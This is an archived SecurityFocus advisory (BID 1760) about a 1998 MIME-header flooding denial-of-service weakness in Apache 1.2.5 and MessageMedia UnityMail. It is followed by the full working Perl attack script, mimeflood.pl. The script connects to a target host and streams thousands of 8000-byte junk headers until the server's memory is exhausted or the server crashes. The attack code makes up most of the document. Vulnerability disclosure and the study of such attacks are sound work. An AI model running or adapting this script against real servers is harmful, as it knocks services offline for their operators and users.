source: http://www.securityfocus.com/bid/1760/info

Apache Web Server and MessageMedia UnityMail are susceptible to a denial of service attack if a significant amount of 8000 byte MIME headers are sent. Both will crash and restart of the application is required in order to regain normal functionality. Other web servers may be also be vulnerable to this attack.

#! /bin/perl

# mimeflood.pl - 02/08/1998 - L.Facq (facq@u-bordeaux.fr)

# Web servers / possible DOS Attack / "mime header flooding"
#
#       looking at the apache 1.2.5 source code i found
#       that there was no limit on how many mime headers could
#       be included in a client request. The only limits
#       are : 8192 byte for each header, 300 sec. on reading headers.
#
#       => by sending a crazy amount of 8000 bytes headers, it's possible
#       to consume a lot of memory (and of course CPU). The point
#       is that httpd daemons grow and STAY at this big size (or die
#       if you send too much)
#
#       -> may be a limit on mime header number could be added.
#
#       -> may be other web server could be vulnerable to this problem.
#
#       - i tried on an apache 1.2.5 -> it works
#       - i didnt installed 1.3.1 but looking at the source code,
#       i think the problem is there too.
#
##################################################
#From Roy T. Fielding / Sep 2 '98 at 12:57 pm -420
#
#[...]
#>
#>       -> may be a limit on mime header number could be added.
#
#Such limits have already been added to 1.3.2-dev.
#
#.....Roy

use Socket;

# Usage : $0 host [port [max] ]
$max= 0;
if ($ARGV[2])
{
    $max= $ARGV[2];
}

$proto = getprotobyname('tcp');
socket(Socket_Handle, PF_INET, SOCK_STREAM, $proto);
$port = 80;
if ($ARGV[1])
{
    $port= $ARGV[1];
}
$host = $ARGV[0];
$sin = sockaddr_in($port,inet_aton($host));

connect(Socket_Handle,$sin);
send Socket_Handle,"GET / HTTP/1.0\n",0;
$val= ('z'x8000)."\n";
$n= 1;
$|= 1;
while (Socket_Handle)
{
    send Socket_Handle,"Stupidheader$n: ",0;
    send Socket_Handle,$val,0;
    $n++;
    if (!($n % 100))
    {
        print "$n\n";
    }

    if ($max && ($n > $max))
    {
        last;
    }
}
print "Done: $n\n";
send Socket_Handle,"\n",0;

while (<Socket_Handle>)
{
    print $_;
}